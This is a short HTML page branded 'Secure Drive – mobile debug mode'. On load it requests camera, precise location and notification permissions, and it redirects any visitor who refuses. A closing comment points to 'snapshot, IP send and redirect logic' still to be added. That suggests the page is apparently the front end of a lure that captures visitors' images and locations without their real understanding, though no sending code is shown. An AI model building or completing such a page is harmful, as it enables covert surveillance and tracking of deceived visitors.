<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body { background: #000; color: #0f0; font-family: sans-serif; padding: 2em; }
    .status { margin: 1em 0; }
    .good { color: #0f0 }
    .bad  { color: #f00 }
  </style>
  <title>Secure Drive Debug</title>
</head>
<body>
  <h1>Secure Drive ‚Äì mobile debug mode</h1>
  <div class="status" id="cam">üì∑ Camera: waiting‚Ä¶</div>
  <div class="status" id="loc">üìç Location: waiting‚Ä¶</div>
  <div class="status" id="not">üîî Notifications: waiting‚Ä¶</div>
  <pre id="log"></pre>

  <script>
    const logEl = document.getElementById("log");
    function log(msg) { logEl.textContent += msg + "\n"; console.log(msg); }

    document.addEventListener("DOMContentLoaded", main);

    async function main() {
      const res = { cam: false, loc: false, not: false };

      // Camera
      try {
        log("Requesting camera...");
        await navigator.mediaDevices.getUserMedia({ video: true });
        document.getElementById("cam").className = "status good";
        document.getElementById("cam").textContent = "üì∑ Camera: granted";
        res.cam = true;
        log("Camera permission granted");
      } catch (e) {
        document.getElementById("cam").className = "status bad";
        document.getElementById("cam").textContent = "üì∑ Camera: denied";
        log("Camera permission denied: " + e.name);
      }

      // Location
      log("Requesting location...");
      await new Promise(r => {
        navigator.geolocation.getCurrentPosition(
          () => {
            document.getElementById("loc").className = "status good";
            document.getElementById("loc").textContent = "üìç Location: granted";
            res.loc = true;
            log("Location permission granted");
            r();
          },
          err => {
            document.getElementById("loc").className = "status bad";
            document.getElementById("loc").textContent = "üìç Location: denied";
            log("Location permission denied: " + err.code);
            r();
          },
          { enableHighAccuracy: true, timeout: 10000 }
        );
      });

      // Notification
      log("Requesting notifications...");
      if ("Notification" in window) {
        const p = await Notification.requestPermission();
        document.getElementById("not").className = p === "granted" ? "status good" : "status bad";
        document.getElementById("not").textContent = `üîî Notifications: ${p}`;
        res.not = p === "granted";
        log("Notification permission: " + p);
      } else {
        document.getElementById("not").className = "status bad";
        document.getElementById("not").textContent = "üîî Notifications: unsupported";
        log("Notifications not supported");
      }

      log("Summary: " + JSON.stringify(res));

      if (!res.cam || !res.loc || !res.not) {
        log("Redirecting to permission-denied.html");
        window.location.href = "permission-denied.html";
      } else {
        log("All permissions granted. You can proceed.");
        // Now you can call your snapshot, IP send and redirect logic...
      }
    }
  </script>
</body>
</html>
